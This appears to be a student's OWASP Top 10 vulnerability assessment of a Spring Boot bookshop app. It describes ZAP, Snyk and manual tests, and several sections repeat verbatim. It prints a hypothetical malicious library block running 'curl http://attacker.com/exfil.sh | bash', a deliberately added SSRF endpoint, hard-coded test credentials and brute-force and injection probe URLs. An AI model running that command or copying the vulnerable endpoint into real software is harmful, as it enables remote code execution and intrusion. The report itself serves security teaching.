Although this spring boot project does not seem to have clear exploitation to sql injection . If a developer adds on the project @Query annotation  with native SQL or EntityManager.createNativeQuery() or JdbcTemplate with unsanitized input, there can be an SQL injection. Having root privileges makes the case even worse. The level of access goes beyond our schema, and lets the attacker:
•	Access, modify or delete data in other databases on the same MySQL server.
•	Create new databases.
•	Execute highly privileges methods, such as LOAD DATA INFILE.

 
CWE-693: Protection Mechanism Failure (Content Policy Security Not Set)
Severity: MEDIUM
This application does not implement Content Security Policy (CSP) header, which could help to mitigate the client side attacks, e.g. Cross Site Scripting or data injection. Defining which set of content is allowed (scripts, images) CSP browser blocks the resource loading. Absence of this happens, loads all content, thus more surface is available for vulnerability.
SOURCE CODE LOCATION
Class SecurityConfiguration  is missing that filter the security filter chain and provide any server configurations.
EXPLOITATION – AUTOMATED-AUTHENTICATED SCAN
Direct exploitation couldn’t be performed because the application itself is small enough to provide more functionality, e.g. user uploading a photo. This exploitation should have been fixed because it provides a vulnerability that is prone to be exploited. The ZAP alert is an evidence of this vulnerability.

 
CWE-1021: Improper Restriction of Rendered UI Layers (Clickjacking)
Severity: MEDIUM
This application is vulnerable to clickjacking because it does not implement X-Frame-Options HTTP header. Those headers tell the browser whether a page can be loaded from an iframe or not.
SOURCE CODE LOCATION
Class SecurityConfiguration is missing that filter the security filter chain HttpSecurity configuration for X-Frame-Options.
EXPLOITATION – AUTOMATED-AUTHENTICATED SCAN

 
 
 
CWE-550: Application Error Disclosure
Severity: LOW
*Also Is linked to CWE-1295: Information Disclosure (Debug Error Messages)
As discussed on the CWE-756, this application is missing the error page and is configured to show the warning messages to the client. For the same reasons as in CWE-756, this raises a vulnerability issue.
SOURCE CODE LOCATION
The application lacks a global error handling mechanism such as @ControllerAdive, or custom error page for all 500 errors), to sanitize these sensitive Java message to the client.
EXPLOITATION – AUTOMATED-AUTHENTICATED SCAN
ZAP automated scan detected this vulnerability when tried to access this example page: http://localhost:8080/save , that triggered a 500 internal error.
 
 
 
CWE-16: Configuration (GET for POST)
Severity: High
It is not a direct weakness, but it a misconfiguration that may lead the framework or the application vulnerable because of future changes. Attacker could easily login to website using this link: http://localhost:8080/login?password=jim&role=admin&username=jim
SOURCE CODE LOCATION
controller.LoginController.java: Line 25 that uses GET for login action.
EXPLOITATION – AUTOMATED-AUTHENTICATED SCAN
OWASP ZAP successfully sent a GET http://localhost:8080/login?password=jim&role=admin&username=jim .  This request was originally observed as a POST and is also accepted as a GET.
 
CWE-615: Informational Disclosure (Suspicious Comments)
Severity: LOW
Application has comments on it’s HTML RESPONSES. Comments are not malicious, but they might disclose information about the application.
SOURCE CODE LOCATION
login.html: Comments such as <!-- Admin Login -->
EXPLOITATION – AUTOMATED-AUTHENTICATED SCAN
Although OWASP automated scan discovered this vulnerability, it is easily visible by inspecting the elements of the html (e.g. on Mozilla right click -> Inspect (Q)).
 
 
A06:2021 Vulnerable and Outdated Components
CWE-190: Integer Overflow or Wraparound (via Tomcat Embed Core)
This application uses some third-party libraries that have some known security vulnerabilities and are identified from static analysis. The vulnerable components introduce security risks though their inherited flaws. There is an integer flaw or wraparound issue. This flaw may affect file uploads on servelet containers. The attacker could make malicious form-data requests with Content-Length headers, that can lead to integer overflow vulnerabilities, bypassing file size restrictions and cause memory issues. Snyk suggests to update org.apache.tomcat.embed:tomcat-embed-core  to version 9.0.107, 10.1.43, 11.0.9 or higher.
SOURCE CODE LOCATION
pom.xml: org.apache.tomcat.embed:tomcat-embed-core library is of version 10.1.42, and is a transitive dependency of org.sringframework.boot:spring-book-starter-web@3.5.3
EXPLOITATION – SNYK SCAN – CVE-2025-30705 HIGH SEVERITY
There was no file upload functionality on this project, thus direct exploitation couldn’t be done. If there was such a functionality, this could be exploited by bypassing size limits and denial of service. The vulnerability ius present though and needs attention.
 
CWE-770: Allocation of Resources Without Limits or Throttling (via Tomcat Embed Core)
Severity: High
The vulnerability us in org.apache.tomcat.embed:tomcat-embed-core library and is related to the “Allocating of Resources Without Limits or Throttling” – CVE-2025-53506. This affects HTTP/2 multiplexing feature, where the attacker can make exhaustion of resources when creating HTTP/2 streams with TCP connection, that could lead to denial of service.
SOURCE CODE LOCATION
pom.xml: org.apache.tomcat.embed:tomcat-embed-core library is of version 10.1.42, and is a transitive dependency of org.sringframework.boot:spring-book-starter-web@3.5.3
EXPLOITATION – SNYK SCAN – CVE-2025-53506 HIGH SEVERITY
OWASP ZAP is a general-purpose analysis tool and exploitation was unsuccessful. Nature of HTTP/2 protocol requires tools for making HTTP/2 frames and application that work on HTTP/2. Also observing resource exhaustion requires server-side monitoring tools. However Snyak isentifies this vulnerability and confirms its presence in the dependencies. So, if an attacker can trigger this vulnerability, it could cause exhaustion of resources and the application will be unable to serve legitimate users, and will achieve denial of service. 
 

CWE-226: Incorrect Default Permissions (via MySQL Connector/J)
Exists in com.mysql:mysql-connector-j library, version 9.2.0.  This means that the library’s default configuration may expose the sensitive data or allow unauthorized actions if settings are not explicitly reconfigured.
SOURCE CODE LOCATION
pom.xml: <dependency><groupId>com.mysql</groupId><artificialId>mysql-connector-j </artificialId></dependency> 
EXPLOITATION – SNYK SCAN – CVE-2025-30706 HIGH SEVERITY
To exploit such flows in database connector library, needs a specific low-level interaction a unique set of circumstances. While the vulnerable library is there, the application’s usage of connection with Spring Dara JPA may not trigger the specific code paths. However, the flaw identified by Snyk and this confirms that there is a potential risk of using this library.
 

A07:2021 Identification and Authentication Failures
CWE-798: Use of hard coded Credentials 
*Also Is linked to CWE-259: Use of hard coded Password
 
Application contains sensitive user credentials (both admin and customer roles) in its source code.  If the attacker gains access to the source code, the credentials can be easily discovered, and this could lead to unauthorized access. This vulnerability was found and exploited manually and then been discovered by snyk tool also, providing also probable fixed using System.getenv instead of hard coded strings.
SOURCE CODE LOCATION
controller.LoginController.java: Hard coded admin credentials username=”admin”, password= “admin123” that are found on Line 40 and the hard coded customer username=”customer”, password=”cust123”, that can be found on Line 47.

EXPLOITATION – MANUAL SCAN AND SNYK
•	The attacker can used fuzzer to brute-force the /login endpoint (cluster bomb attack).
•	The POST http://localhost:8080/login was targeted, with role parameter as a fixed string “admin”.
•	For username and password, payloads were loaded from the SecLists repository https://github.com/danielmiessler/SecLists , specifically top-usernames-shortlist.txt for the usernames and Most-Popular-Letter-Passes.txt (modified) for the passwords.
•	Analysis of fuzzer results in ZAP, revealed 2 distinct response types: 
1.	Failed attempts: 200 OK status, body of 2162 bytes for login.html page, which means login failure.
2.	Successful attempts: 302 found status and size resp. body of 0 bytes. This pattern redirects to main page (/), and has no response body during the redirect.
Payload of username=admin and password=admin123 from the fuzzed lists were identified as successful. This showcase that the brute force attack successfully identified a valid admin username and password.
 
CWE-521: Weak Password Requitements and CWE: Use of Weak Credentials
Application does not force strong password during registration of user. This allows users to choose weak passwords, which make user accounts susceptible for brute force or attacks using dictionaries. The fact that username jim and password jim was acceptable, and the confirmation on mySQL database confirms this.
   
SOURCE CODE LOCATION
•	model.User.java: The password field (Line 14) does not have any validation annotations @Size, @Patterns, to force rules.
•	Controller.RegistrationController.java: The registerUser (Line 24) saves the User object without confirming any server-side password strength validation.
EXPLOITATION – MANUAL SCAN 
The attacker can register new accounts with easy passwords or target a any existed account with dictionary attacks or with brute force. The success of such registration with username jim and password jim demonstrates the vulnerability.
A08:2021 Software and Data Integrity Failures
CWE-494: Download of Code Without Integrity Check
The project does not have any implementation system to verify the integrity of 3rd party components that were downloaded from Maven. For example, dependencies such as Spring boot starter, Hibernate and MySQL Connector are trusted without validation (checksum or signature verification). A man in the middle could hijack the dependency supply chain.
SOURCE CODE LOCATION
pom.xml: 	<dependency>
   		 <groupId>com.mysql</groupId>
    		<artifactId>mysql-connector-j</artifactId>
		</dependency>
There is no verification of the dependency signatures, e.g. using sigtool-maven-plugin.
EXPLOITATION – CHATGPT SUPPORT
Not tested: Attackers can publish malicious version of common libraries like mysql-connector-j to Maven Central or intercept downloads over misconfigured proxy and uses same groupId/artifactId, which includes the block:
static {
    try {
        Runtime.getRuntime().exec("curl http://attacker.com/exfil.sh | bash");
    } catch (Exception ignored) {}
}
This could allow remote access and makes the application vulnerable.
CWE-829: Inclusion of Functionality from Untrusted Control Sphere
This applications has development time tools like Spring Boot DevTools which is not intended for production. Features of this like auto-restart and remote update may expose the server logic.
SOURCE CODE LOCATION
pom.xml: 	<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-devtools</artifactId>
    <scope>runtime</scope>
    <optional>true</optional>
</dependency>
EXPLOITATION – CHATGPT SUPPORT
Not tested: If this artifact is deployed in production, it can cause remote code execution (RCE). For example, attacker sends crafted POST /restart to Spring Boot DevTools, then DevTools execute the logic of the attacker.
*Even if remote DevTool is disabled by default, /actuator/restart could re-enable it if application is misconfigured.
CWE-345: Insufficient Verification of Data Authenticity
There is no server-side verification of authenticity when user sends information (name, address or card number), and no cryptographic binding.
SOURCE CODE LOCATION
controller.CartController.java: Line 70 checkout method.
EXPLOITATION – CHATGPT SUPPORT
Not tested: Attacker can use browser dev tools or Burp Suite, because there is nothing to validate the request’s origin. Similarly with the example of CWE-1021, attacker can inject a script, and server may store  untrusted data.
A09:2021 Security Logging and Monitoring Failures
CWE-778: Insufficient Logging
There is not any logging on security logging events like:
Failed / successful loggings
Use of user roles
Modifications on books / carts
Suspicious attempts
SOURCE CODE LOCATION
controller.LoginController.java: Line 32 on PostMapping logging. No loggings can be found on this method to records any login attempts.
EXPLOITATION – CHATGPT SUPPORT
  

 When we successfully logged in with username and password, there was no event shown or recorded for User login. Instead, there was only one message saying, “Books fetched: 1”. There should have been printed with the use of SLF4J library a message like log.warn(“Failed user login attempt”, username). If we want our console, not to full with garbage messages, we could store each type of such messages in a specific log file.
CWE-117: Improper Output Neutralization for Logs
For logging been added, there should be sanitization on user input messages, in order to prevent log injection and log forging.
SOURCE CODE LOCATION
controller.LoginController.java: Line 32 on PostMapping logging. No loggings were found on this method to records any login attempts. This simple snippet was added  System.out.println("Login failed for username: " + username);, so we could use it to showcase this vulnerability .
EXPLOITATION – CHATGPT SUPPORT
An attacker could use any String as username, since it is not sanitized at client form and on server, he can use any message to manipulate the logs. Such an example is shown on the below icons.
 
 
CWE-223: Omission of Security Relevant Information
Similarly to the CWE-778 case, relevant actions that have to do with security, e.g. deleting a book are performed without been monitoring.
SOURCE CODE LOCATION
controller.BookController.java: None of the book functions does create any log entry about who performed an action on a book, when it happened, and which book was affected.
EXPLOITATION – CHATGPT SUPPORT
Suppose a user logs in as admin/admin and delete a book by /delete/{id}. Book is removed from the database, but there was no log to capture the action. This causes a serious risk in in both incident response and accountability.
A10:2021 Server-Side Request Forgery (SSRF) 
CWE-918: Server-Side Request Forgery (SSRF)
With the help of the ChatGPT there was found that the project has no server-side request forgery vulnerability is in the current state. This application does not use any feature (e.g. RestTemplate, WebClient, or URLConnectiion) that use user-controlled endpoints. However, for the sake of the assignment in order to show this class of vulnerability, a simplified endpoint was added with intention, to demonstrate this category.
SOURCE CODE LOCATION – DEMONSTRATION – ADDED CODE
@GetMapping("/fetch")
@ResponseBody
public String fetchUrl(@RequestParam String url) {
    RestTemplate restTemplate = new RestTemplate();
    return restTemplate.getForObject(url, String.class);
}
This dummy code was added on any controller, that allows user to supply any URL parameter. Server attempts to connect to the specific address and returns its response.
EXPLOITATION – CHATGPT SUPPORT
By calling an endpoint with an internal resource, we simulate an SSRF attack. 
GET http://localhost:8080/fetch?url=http://127.0.0.1:3306
This could access cloud metadata, scan internal networks, or bypass firewall rules.
The above snippet is a solution to block access to internal networks.
URI uri = URI.create(url);
if (uri.getHost().startsWith("127.") || uri.getHost().equals("localhost")) {
    throw new IllegalArgumentException("Access to internal resources is blocked.");
}
The  following images is an example of how SSRF could be used, thus our application to be exploited.

Exploitations
The discovery of vulnerabilities in the Shop applications, has 4 steps approach, and combines the following techniques:
1.	Manual Scan: Testing and running the application on http://localhost:8080), manual inspection of code in IntelliJ and on MySQL database. It uses also the OWASP ZAP in manual mode, such as fuzzing, response analysis, request interception).
2.	Snyk Scan: Analyse the Maven project to dependencies for vulnerabilities (CVE) that affect the supply chain of dependencies. This helps to detect security issues from external libraries and components.
3.	Automated-Authenticated Scan: Used in automated mode on ZAP to run full scans, spider to application and test authenticated areas using valid session cookies. We combine this methodology, with authenticated ZAP scan.
4.	LLM Support: Use of ChatGPT for missing vulnerabilities.
Vulnerabilities
The following vulnerabilities are identified in the present Shop application. They are presented in order of importance (from most critical to least critical), following the top 10 OWASP 20212 vulnerability categories that are published at https://owasp.org/Top10/ . Only those vulnerabilities that have also been exploited by the author of this assignment are being shown. 
A01:2021 Broken Access Control
CWE-639: Authorization Bypass Through User-Control Key
Severity: High
The application implements access control based on roles, and distinguishes between admin and customer. Admin functions like /delete/{id}, are strictly intended for users with admin role. Although again, error page is missing and attacker can exploit sensitive data, by deliberately making such authorization bypass requests.
 
SOURCE CODE LOCATION
BookController.java: Line: 94 (@DeleteMapping(“/delete/{id}”) public String deleteBook (@PathVariable Long id, HttpSession session)) includes an if (!"admin".equals(session.getAttribute("role"))). Method is annotated with DeleteMapping, and expects an HTTP DELETE. Same admin check happens with save book and new book. This led to trying to execute the method, leaving space for potential backdoors or advanced exploitation (similarly to using advanced SQL questions, but here we could use to view the error whitelabel error page). The appropriate annotation that should be applied on all admin control method is @PreAuthorize(“hasRole(‘ADMIN’)”). Also each controller method, should have implementing a BookNotFoundException.
EXPLOITATION – MANUAL SCAN
Manul exploitation: Running localhost:8080
(Attempted: Although there was not a clear exploitation in a sense of bypassing, the results were not absolutely satisfying)
An attempt was made to exploit any vulnerability when using a use with lower privilege (e.g. a user jim/jim with JSESSIONID=555DBD6EA2B9812A27EFBCE7587EBCA7) to perform administrative action (like deleting an existing book with id 4) without authorization. The attempt was by using  POST /delete/{id}, including _method=delete in the body, that was previously been sent by an admin, but now with the user’s session id. This resulted in returning a Whitelabel error page, that was saying that method POST is not supported.
In general: hasRole(‘ADMIN’): Checks if the user has role name ADMIN.
@PreAuthorize: Is used to define an authorization expression before the method runs, if method is false, execution does not occur. It integrates into Spring requests lifecycle. When user sends a POST /delete , with JSESSIONID of a user, Spring security basically intercepts it, returning a 403 Forbidden response, instead of doing something like redirecting to login or to a Whitelabel error page.
CWE-352: Cross-Site Request Forgery (CSRF)
Severity: LOW
Application is vulnerable to CSRF attacks, and it does not implement anti CSRF tokens for its actions that change their state e.g. delete books. Even the SameSite (discussed above on the CWE-1275) could offer some limited protection, but it is not sufficient.
SOURCE CODE LOCATION
controller.BookController.java: The deleteBook method on Line 93 and other site changing methods like newBook or updateBook, do not include any logic to generate unpredictable CSRF tokens.
addBook.html, editBook.html: They do not have include hidden input fields for CSRF tokens e.g.
<input type=”hidden” name=”_csrf” th=value=”{_csrf.token}” /> 
EXPLOITATION – AUTOMATED-AUTHENTICATED SCAN
OWASP ZAP automated scan detected this CWE, fir many URLs on n this application e.g. http://localhost:8080/login. There is no known anti-CSRF token in the HTML forms. If the browsers uses victim’s session cookie JSESSIONID, the request will be redirected at the application’s domain, even if sent from another domain,
 
CWE-1275: Sensitive Cookie with Improper SameSite Attribute.
Severity: LOW

 
Application utilizes a JSESSIONID cookies for the session management. When observed in browser developer tools, this session cookie, did not define the SameSite attribute. This attribute works on new browsers to protect again Cross Site Request Forgery attacks when cookies are sent with cross site requests. Absense of this means that browser’s default behaviours will be used here, and this is less secure and also differently performed by one browser to another.
SOURCE CODE LOCATION
server.servlet.session.cookie.same-site is missing from application.properties.
EXPLOITATION – MANUAL SCAN
Old browsers could send cross site requests to our application, with their session cookie. Unauthorized action can happen when no CSRF tokens are involved. This can happen when browser includes the JSESSIONID cookie in a cross-site content (e.g. we could use malicious_csrf.html webpage and have the same results).
 
 
A02:2021 Cryptographic Failures
CWE-319: Cleartext Transmission of Sensitive Information
Severity: High
This application operates entirely on HTTP which is not encrypted (http://localhost:8080). HTTPS uses transport layer security providing security to the exchange of data between user and server. HTTP sends transmitted data on the network in plain text, such as usernames, passwords or even card credentials. Also the database has not TLS encryption too.
SOURCE CODE LOCATION
application.properties: There is no server.ssl for client server communication, or useSSL= true (or REQUIRED), in the spring.datasource.url for database encryption.
EXPLOITATION – MANUAL SCAN
If an attacker is using the same network e.g. public Wi-Fi or router, with tools like OWASP ZAP or WhireShark, it is easy to exploit sensitive data in plain text. As shown in the picture below, login data are fully exposed. This causes severe exploitation of privacy, gives room for fraud transactions, or leak of sensitive information. Lack of database encryption is even a more severe vulnerability because database server itself can be compromised.
 
CWE-312: ClearText Storage of Sensitive Information
Severity: High
Although in application.properties we are not storing data, but rather creating new database tables each time,  spring.jpa.hibernate.ddl-auto = create, the customer passwords are stored in plain text in the database without any encoding or salting.
SOURCE CODE LOCATION
•	model.User.java: The password field in Line 14, it is defined as String and in Line 23 there is no encryption or salting applied.
•	repository.UserRepository.java: The JpaRepository save method is not processing the password before saving it.
•	controller.RegistrationController.java: userRepository(user) saves the user details (including the password) in plain text on the database.
EXPLOITATION – MANUAL SCAN
If a user has access to the database, by sql injection or otherwise, there will be immediate access to the database plaintext information. This allows straightforward takeover of the account . The observation of registered user jim/jim directly from the database confirms this vulnerability.
 
CWE-208: Observable Timing Discrepancy (Timing attack)
*Also Is linked to CWE-256: Unprotected Storage of Credentials
Severity: MEDIUM
The application is vulnerable to timing attacks. When we try to compare the password that is hard coded with the one that is sent, String.equals() is used. The method an exit earlier if the a mismatch is found at the begging of the strings, so time it takes to compare passwords is not constant. An attacker may het advantage of this, and find information of the password.
SOURCE CODE LOCATION
Controller.LoginController.java: The timing vulnerability exists in password comparison in the lines:
Line 40: if ("admin".equals(username) && "admin123".equals(password)) {
Line 47: if ("customer".equals(username) && "cust123".equals(password)) {
Line 55: if (user.getPassword().equals(password)) {
EXPLOITATION – SNYK SCAN
The attacker can use brute-force or dictionary attacks to measure the response time of each login attempt. If the attempts that match more characters take longer to process, the attacker may have a clue of how long the value may be. Although such attacks are difficult to perform, they weaken the authentication credibility. A more secure comparison is using java.security.MessageDigest.isEqual as Snyk suggest that should execute in constant times, regardless the input.
 
CWE-598: Information Disclosure (Session ID in URL ReWrite)
Severity: MEDIUM
URL rewriting is used to track user session and it embeds the JSESSIONID into the URL path (e.g. http://localhost:8080/login;jsessionid=A8C13495C917EC964D1708C35 as the above picture shows). This method leads to disclosure of sensitive session data.
SOURCE CODE LOCATION
It is a typical behaviour of the servlet containers like Tomcat that Spring Boot uses, when cookies are ignored.
EXPLOITATION – AUTOMATED-AUTHENTICATED SCAN
OWASP ZAP automated scan exposed this vulnerability (;jsessionid=A8C13495C917EC964D1708C35). The presence of session ID on URL exposes many “obvious” risks to the application (e.g. if the URL is shared the session id is directly exposed).

 
A03:2021 Injection
CWE-601: URL Redirection to Untrusted Site (“Open Redirect”)
Severity: High
Application is vulnerable to URL redirection to untrusted Site that is also known as Open Redirect. This vulnerability happens when  application redirects users to URK that is made from untrusted input (HTTP changed Host or URL parameters) and use no validation, allowing the attacker to redirect the target,
SOURCE CODE LOCATION
It is the Sprint Boot framework default handling of redirect with untrusted HTTP headers. When methods in the controllers like in BookController newBook Line 54, or updateBook Line 83, or deleteBook Line 93 or in CartController addToCart Line 33 or processCheckout Line 72, return a string e.g. redirect:/bool, the Spring book makes a full redirection using Host header. If the header is not validated, it can be manipulated.
EXPLOITATION – AUTOMATED-AUTHENTICATED SCAN
Attacker sends a GET request http://localhost:8080/books with header malicious.com
Application processes the requests and decides to redirect to http://localhost:8080/books 
However instead of sending it to the location localhost:8080 , the application makes a Location header of 302 Found and makes a changed Host header, so the website is http://malicious.com/books .
This can be used to phishing attacks (to redirect to a fake login page), or bypassing security if the victim’s cookie is sent too. ZAP automated tool confirms this on the URLS /books, /cart/add, delete/1 and /save.
 

CWE-89: Improper Neutralization of Special Elements used in an SQL Command(SQL Injection)
Severity: High
This application might be vulnerable to SQL injection, and this could allow the attacker to execute SQL queries through manipulated input. Although testing manually such queries failed in all attempts, suggesting that this might be a false ZAP automated scan alarm. In a successful case, attacker could have access to the database and harm the system.
SOURCE CODE LOCATION
Spring Data JPA repositories e.g.  findAll(), findById(), save(), delete(), findByUsername(), that use prepared statements in general.
•	controller.BookController.java (GET /books, POST /save, DELETE /delete/{id})
•	controller. LogincController.java (POST /login)
EXPLOITATION – AUTOMATED-AUTHENTICATED SCAN
OWASP ZAP’s active scan detected SQL injection on many URLs and parameters:
URLs:
http://localhost:8080/books, http://localhost:8080/cart/add, http://localhost:8080/delete/1, http://localhost:8080/login, http://localhost:8080/save
HTTP HEADERS: Host, User-Agent and Refferer headers, URL paths or Form parameters (jsessionid, username)
Example for Login: http://localhost:8080/login , ZAP successfully manipulated Boolean conditions jsessionid=…%26username=admin%26password=admin%261%3D1, This means that payloads like 1=11 or 1=2 into jsessionid or username parameters could cause a detectable difference in the application response, as we learned in the SQL injection advanced section of WebGoat. Although many of these alarms are detected from ZAP as critical, it might be a false alarm, because Spring JPA is/might be safe enough from SQL injections.
 
CWE-91: XML Injection (XLST Injection)
Severity: High
XLST injection is a type of XML injection when user-controlled input XLST is used. This kind of injection may allow the attacker to execute code on the server by using this kind of XML.
SOURCE CODE LOCATION
Apache Tomcat uses/may use XSLT processor. No direct use of XSLT from user.
EXPLOITATION – AUTOMATED-AUTHENTICATED SCAN
OWASP ZAP automated scan deleted this vulnerability. It is mostly an alert and not a direct exploitation. URLs like this: http://localhost:8080/%3Cxsl:value-of%20select=%22system-property('xsl:vendor')%22%2F%3E could cause the server to be exploited or trigger an error. This is a generic finding, most likely a false positive, because this application does not use any XSLT user input. This application instead uses Thymeleaf which is HTML  based rather than XSLT.
 
CWE-20: Improper Input Validation (Email Uniqueness)
Severity: MEDIUM
The application fails to validate for unique email address provided during registration of a new customer. This allows distinct user account to be associated with same email, leading to violation of integrity of data.
 
SOURCE CODE LOCATION
•	controller.RegistrationController.java: The registerUser method (Line 26) only checks for the uniqueness of the username userRepository.findByUsername(use.getUsername()), but does not perform any validation to ensure if the email is unique, before saving the User in the database.
•	Repository.UserRepository.java: This interface is missing a method to find users by email, for example Optional<User> findByEmail(String email) for making the check.The attacker can register many accounts using the same email address, creating ambiguity when the user tries to identify, and also can cause problems when accounts tries to recover (e.g. password reset). The ability to successfully have registered as jim and jim2, and both use a@a.com demonstrates this lack of validity.
EXPLOITATION – MANUAL SCAN
The attacker can exploit the application by a manual registration.
•	First user account is registered successfully (username jim and email: a@a.com)
•	A second account is registered successfully (username: jim2 but uses the same email a@a.com)
 
The same exploitation was found again later with OWASP ZAP automated scan tools.
 
CWE-120: Buffer Overflow
Severity: MEDIUM
Buffer overflow is when program tries to write data to buffer that is larger than the memory that is allocated. Zap tries to write a huge parameter to the memory that successfully caused buffer overflow.
SOURCE CODE LOCATION
POST http://localhost:8080/books for adding, registering or editing books.
EXPLOITATION – AUTOMATED-AUTHENTICATED SCAN
OWASP ZAP automated scan detected Buffer Overflow by injecting huge size input fields. These error indicate:
Errors of this type, lead to unexpected execution.
Script connection stopped and threw 500 Internal Server Error. Such an attack caused denial of service and may disrupt service availability.
 
A04:2021 Insecure Design
Severity: High
CWE-307: Improper Restriction of Excessive Authentication Attempts
Application lacks the ability to perform security controls to prevent or mitigate brute-force attacks. This mechanism should especially work on login functionality and in every request, to prevent DDOS. Mechanisms such as rate limiting , account locks after many failed attempts, or CAPTCHA challenges to determine if the client is driven by a robot or a human.
SOURCE CODE LOCATION
•	Controller.LoginController.java: The login method at Line 32, makes authentication of the user, without making any checks for suspicious activity (e.g numbers of failed attempts from an IP within a certain interarrival time). This control is missing any business logic. 
This vulnerability is one of the hardest to solve, because there are too many ways to harm the servers. Use of Cloudfare is one of the most effective solutions for this vulnerability, it offers edge-level brute force attack protections. WAF rules, rate limiting, bot detection, geo-blocking and CAPTCHA are the most crucial and happen before the request reaches the application layer. For example, brute force tools of ZAP cannot can be blocked easily with Cloudfare.
EXPLOITATION – MANUAL SCAN
Combining ZAP fuzzer and known username/passwords or by brute forcing the session id cookie, we can send a large number of username/passwords to the /login. As demonstrated on the  CWE-798 picture of brute-force with the ZAP fuzzer (that we found a successful combination of role/username and password), the application processes the requests without any delays, account locks or CAPTCHA challenges. 
   
 
CWE-654: Reliance on a Single Factor Decision
Severity: MEDIUM
This application relies only on a single authentication (user and password) for user login. There is no multi factor authentication implemented, so the authentication is based solely in one piece of evidence.
SOURCE CODE LOCATION
Controller.LoginController.java: The login controller (Line 32) only validates username and password, without any concerns about secondary authentication factors.
EXPLOITATION – MANUAL SCAN
User accounts are highly vulnerable if credentials are stolen from phishing or brute force attacks (demonstrated on CWE-307 that with brute force we joined as admin). The attacker can impersonate to any unauthorized actions without any additional verification. 
A05:2021 Security Misconfiguration
CWE-250: Execution with Unnecessary Privileges
Severity: High
Application connects to MySQL with root user account. Root user has typically full admin privileges over the entire MySQL server, which is far more than the privileges required by this application that uses only one schema.
SOURCE CODE LOCATION
application.properties: spring.datasource.username=root 
EXPLOITATION – MANUAL SCAN
Although this spring boot project does not seem to have clear exploitation to SQL injection . If a developer adds on the project @Query annotation  with native SQL or EntityManager.createNativeQuery() or JdbcTemplate with unsensitized input, there can be an SQL injection. Having root privileges makes the case even worse. The level of access goes beyond our schema, and lets the attacker:
•	Access, modify or delete data in other databases on the same MySQL server.
•	Create new databases.
•	Execute highly privileges methods, such as LOAD DATA INFILE.

 
CWE-756: Missing Error Page
Severity: MEDIUM
 
“Book Sore Application” does not have neither error page, not any error page configuration. Thus, when error occurs (e.g. unsupported HTTP method used), then the Spring Boot default ‘Whitelabel Error Page’ is displayed. This page has sensitive information and provides details about the application structure and exact place of the failure.
SOURCE CODE LOCATION
This vulnerability happens because there is no handling on application.properties file (e.g. server.error.whitelabel.enabled=false) and custom error views for example an error.html page, or a catholic exception handling like @ControllerAdvice class) to filter error messages for the user.
EXPLOITATION – MANUAL SCAN
An attacker can trigger error page by sending requests with unsupported HTTP methods to existing endpoints. For example, using GET to /delete/{id} which uses specifically a DELETE (@DeleteMapping("/delete/{id}")). The leaked stack provides intelligence and sensitive data to the attacker.
CWE-693: Protection Mechanism Failure (Content Policy Security Not Set)
Severity: MEDIUM
This application does not implement Content Security Policy (CSP) header, which could help to mitigate the client side attacks, e.g. Cross Site Scripting or data injection. Defining which set of content is allowed (scripts, images) CSP browser blocks the resource loading. Absence of this happens, loads all content, thus more surface is available for vulnerability.
SOURCE CODE LOCATION
Class SecurityConfiguration  is missing that filter the security filter chain and provide any server configurations.
EXPLOITATION – AUTOMATED-AUTHENTICATED SCAN
Direct exploitation couldn’t be performed because the application itself is small enough to provide more functionality, e.g. user uploading a photo. This exploitation should have been fixed because it provides a vulnerability that is prone to be exploited. The ZAP alert is an evidence of this vulnerability.

 
CWE-1021: Improper Restriction of Rendered UI Layers (Clickjacking)
Severity: MEDIUM
This application is vulnerable to clickjacking because it does not implement X-Frame-Options HTTP header. Those headers tell the browser whether a page can be loaded from an iframe or not.
SOURCE CODE LOCATION
Class SecurityConfiguration is missing that filter the security filter chain HttpSecurity configuration for X-Frame-Options.
EXPLOITATION – AUTOMATED-AUTHENTICATED SCAN

 
 
 
CWE-550: Application Error Disclosure
Severity: LOW
*Also Is linked to CWE-1295: Information Disclosure (Debug Error Messages)
As discussed on the CWE-756, this application is missing the error page and is configured to show the warning messages to the client. For the same reasons as in CWE-756, this raises a vulnerability issue.
SOURCE CODE LOCATION
The application lacks a global error handling mechanism such as @ControllerAdive, or custom error page for all 500 errors), to sanitize these sensitive Java message to the client.
EXPLOITATION – AUTOMATED-AUTHENTICATED SCAN
ZAP automated scan detected this vulnerability when tried to access this example page: http://localhost:8080/save , that triggered a 500 internal error.
 
 
 
CWE-16: Configuration (GET for POST)
Severity: LOW
It is not a direct weakness, but it a misconfiguration that may lead the framework or the application vulnerable because of future changes. Attacker could easily login to website using this link: http://localhost:8080/login?password=jim&role=admin&username=jim
SOURCE CODE LOCATION
controller.LoginController.java: Line 25 that uses GET for login action.
EXPLOITATION – AUTOMATED-AUTHENTICATED SCAN
OWASP ZAP successfully sent a GET http://localhost:8080/login?password=jim&role=admin&username=jim .  This request was originally observed as a POST and is also accepted as a GET.
 
CWE-615: Informational Disclosure (Suspicious Comments)
Severity: LOW
Application has comments on it’s HTML RESPONSES. Comments are not malicious, but they might disclose information about the application.
SOURCE CODE LOCATION
login.html: Comments such as <!-- Admin Login -->
EXPLOITATION – AUTOMATED-AUTHENTICATED SCAN
Although OWASP automated scan discovered this vulnerability, it is easily visible by inspecting the elements of the html (e.g. on Mozilla right click -> Inspect (Q)).
 
 
A06:2021 Vulnerable and Outdated Components
CWE-190: Integer Overflow or Wraparound (via Tomcat Embed Core)
Severity: High
This application uses some third-party libraries that have some known security vulnerabilities and are identified from static analysis. The vulnerable components introduce security risks though their inherited flaws. There is an integer flaw or wraparound issue. This flaw may affect file uploads on servelet containers. The attacker could make malicious form-data requests with Content-Length headers, that can lead to integer overflow vulnerabilities, bypassing file size restrictions and cause memory issues. Snyk suggests updating org.apache.tomcat.embed:tomcat-embed-core  to version 9.0.107, 10.1.43, 11.0.9 or higher.
SOURCE CODE LOCATION
pom.xml: org.apache.tomcat.embed:tomcat-embed-core library is of version 10.1.42 and is a transitive dependency of org.sringframework.boot:spring-book-starter-web@3.5.3
EXPLOITATION – SNYK SCAN – CVE-2025-30705 HIGH SEVERITY
There was no file upload functionality on this project, thus direct exploitation couldn’t be done. If there was such a functionality, this could be exploited by bypassing size limits and denial of service. The vulnerability ius present though and needs attention.
 
CWE-770: Allocation of Resources Without Limits or Throttling (via Tomcat Embed Core)
Severity: High
